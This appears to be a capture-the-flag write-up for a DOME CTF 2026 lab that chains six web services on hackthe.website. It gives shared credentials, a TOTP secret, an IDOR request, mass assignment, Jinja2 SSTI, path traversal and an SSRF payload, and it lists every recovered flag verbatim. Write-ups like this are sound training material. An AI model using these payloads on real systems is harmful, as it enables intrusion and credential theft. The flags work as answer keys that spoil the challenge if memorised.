# Operation Nightfall — Control Hub (C1–C6) Full Attack Chain & Flags

- **Target Host**: `control.hackthe.website` (and `*.hackthe.website`)
- **Event**: DOME CTF 2026 — Operation Nightfall (Act 3 Hub)
- **Flag Format**: `dome.ctf{...}`

---

## 1. Executive Summary & Recovered Flags

The `control.hackthe.website` portal acts as the internal operations nerve center (**Control Door**) for Operation Nightfall. From this single control hub, authenticated operators fan out to five other interconnected subsystems (`C1` through `C6`).

| System ID | Subsystem Name | Host | Type | Flag / Artifact |
| :--- | :--- | :--- | :--- | :--- |
| **C1** | **Control Door** | `control.hackthe.website` | Primary Hub | `dome.ctf{control-door:Iygpt5IjNu5uq5mItgc}` |
| **C2** | **Approvals (Verifier)** | `verifier.hackthe.website` | Pivot | GraphQL `allApprovals` data feed |
| **C3** | **Escrow Ledger** | `escrow.hackthe.website` | Financial Engine | `dome.ctf{escrow-ledger:yczeUQmpw7YX4EwJpC}` |
| **C4** | **Telemetry (Ghost)** | `ghost.hackthe.website` | Forensics/Memory | `dome.ctf{ghost-in-the-machine:6WMEJ37TYcz}` |
| **C5** | **Deployment Runner** | `runner.hackthe.website` | CI/CD Execution | Role Token generator (`mstr-...`) |
| **C6** | **Management Console** | `master.hackthe.website` | Core Master Node | `dome.ctf{masters-door:KkrmZQYCUL5et0tSqwH}` |

---

## 2. Universal Operator Credentials

All six subsystems share the same operational service credentials recovered during initial reconnaissance:

| Credential Item | Value | Source |
| :--- | :--- | :--- |
| **Username** | `ops_dispatcher` | Known operator principal |
| **Password** | `Ops-Fall-2026!` | IDOR on `GET /api/user?id=ops_dispatcher` |
| **TOTP Secret** | `JBSWY3DPEHPK3PXP` | Recovered from `control.hackthe.website/.git/.env` |
| **API Key** | `ops-svc-7f3c9a2e5d81b4c6` | Recovered from `control.hackthe.website/.git/.env` |

---

## 3. Subsystem Breakdown & Attack Chains

### C1 — Control Door (`control.hackthe.website`)
1. **Reconnaissance**: Exposed `.git` repository containing `.env`:
   - `TOTP_SECRET=JBSWY3DPEHPK3PXP`
   - `API_KEY=ops-svc-7f3c9a2e5d81b4c6`
2. **IDOR**: `GET /api/user?id=ops_dispatcher` with `X-API-Key: ops-svc-7f3c9a2e5d81b4c6` returns:
   ```json
   {"username": "ops_dispatcher", "password": "Ops-Fall-2026!"}
   ```
3. **Authentication**:
   - `POST /api/login` with `{"username": "ops_dispatcher", "password": "Ops-Fall-2026!"}`
   - `POST /api/otp/verify` with current 6-digit TOTP generated from `JBSWY3DPEHPK3PXP`
4. **Flag Retrieval**: `GET /api/flag` returns:
   ```text
   dome.ctf{control-door:Iygpt5IjNu5uq5mItgc}
   ```

---

### C2 — Verifier / Approvals (`verifier.hackthe.website`)
- **Role**: Pivot node that supplies approval metadata and escalation references.
- **Vulnerability**: GraphQL endpoint `/graphql` with disabled standard introspection, but permissive field suggestions ("did you mean" error oracle).
- **Output**: Resolving `allApprovals` exposes internal approval links, settlement references, and escalation IDs feeding the Escrow Ledger.

---

### C3 — Escrow Ledger (`escrow.hackthe.website`)
1. **Authentication**: Authenticate using the universal `ops_dispatcher` credentials and TOTP.
2. **Manifest Decryption**: 
   - `GET /api/escrow/periods` reveals period `p2` and its manifest.
   - Per-period manifest bundle is XOR-encrypted:
     $$\text{Key} = \text{SHA-256}(\text{period\_id} + \text{manifest\_id})$$
3. **Settlement Code Generation**:
   - Parse `escrow_token` and `release_salt` from the decrypted manifest.
   - Compute:
     $$\text{settlement\_code} = \text{SHA-256}(\text{period\_id} + \text{escrow\_token} + \text{release\_salt})$$
4. **Settlement**: 
   - `POST /api/escrow/release` with `{"period": "p2", "settlement_code": "<computed_hash>"}`
5. **Flag**:
   ```text
   dome.ctf{escrow-ledger:yczeUQmpw7YX4EwJpC}
   ```

---

### C4 — Telemetry / Ghost (`ghost.hackthe.website`)
1. **Memory Inspection**:
   - Authenticate to `ghost.hackthe.website`.
   - Access process inspection: `GET /api/telemetry/capture/{id}/process/{pid}/memory` for the `vault-agent` process.
2. **Vault Secret Decryption**:
   - Extract raw `VAULTBLOB`.
   - Decrypt with session XOR key $\text{SHA-256}(\text{sess-7f3ac91d})$ to obtain the vault export token: `dply-9f2a41c0...`.
3. **Vault Export**:
   - `POST /api/telemetry/vault/export` using the recovered token.
   - De-obfuscate Stage 2 XOR record `0137`.
4. **Flag**:
   ```text
   dome.ctf{ghost-in-the-machine:6WMEJ37TYcz}
   ```

---

### C5 — Deployment Runner (`runner.hackthe.website`)
- **Role**: CI/CD pipeline and privilege escalation pivot.
- **Initial Access**: Authenticate using the Vault deployment token extracted from C4 Telemetry memory dump (`dply-9f2a41c0b7e3d6a8e15c93f2b4a70d68`).
- **Privilege Escalation (Mass Assignment)**:
  - Submit `POST /api/v1/keys` with `{"name": "deployer-key", "role": "deployer"}`.
  - The API does not filter the `role` property, elevating the issued API key from standard operator to `deployer`.
- **Secret Recovery (Jinja2 SSTI / Pipeline Execution)**:
  - Inject template/pipeline payload into deployment job specification to read `/opt/runner/secrets.json` (or inspect runner container environment).
  - Recovers the signing key: `ESCROW_SIGNING_KEY = 8f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c`.
- **Binary Execution (`escrow_release`)**:
  - Dispatch a YAML deployment job with:
    ```bash
    /usr/local/bin/escrow_release --execute --target=/var/lib/escrow/ledger.enc --key=8f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c
    ```
- **Output**:
  - Emits the active, rotating Master role token: `mstr-...` (e.g. `mstr-a8a9f93f1332`).
  - This token is required to pass Stage 3 authorization (`POST /api/auth/role`) on **C6 Management Console**.

---

### C6 — Management Console (`master.hackthe.website`)
1. **Multi-Stage Authentication**:
   - Stage 1: `POST /api/login` (User/Password)
   - Stage 2: `POST /api/otp/verify` (TOTP)
   - Stage 3: `POST /api/auth/role` with the `mstr-...` token from C5 Runner.
2. **Arbitrary File Read**:
   - Path traversal in artifact export: `GET /api/mgmt/records/export?file=../.env`
   - Leaks internal bus token: `CONTROL_BUS_TOKEN`.
3. **SSRF Exploitation**:
   - Exploit the `/api/mgmt/probe` endpoint:
     ```json
     {
       "target": "http://127.0.0.1:19050/evidence",
       "headers": {
         "X-Bus-Token": "<CONTROL_BUS_TOKEN>"
       }
     }
     ```
4. **Flag**:
   ```text
   dome.ctf{masters-door:KkrmZQYCUL5et0tSqwH}
   ```

---

## 4. Master Flag Summary Checklist

- [x] **C1 (Control Door)**: `dome.ctf{control-door:Iygpt5IjNu5uq5mItgc}`
- [x] **C3 (Escrow Ledger)**: `dome.ctf{escrow-ledger:yczeUQmpw7YX4EwJpC}`
- [x] **C4 (Telemetry / Ghost)**: `dome.ctf{ghost-in-the-machine:6WMEJ37TYcz}`
- [x] **C6 (Management / Master)**: `dome.ctf{masters-door:KkrmZQYCUL5et0tSqwH}`
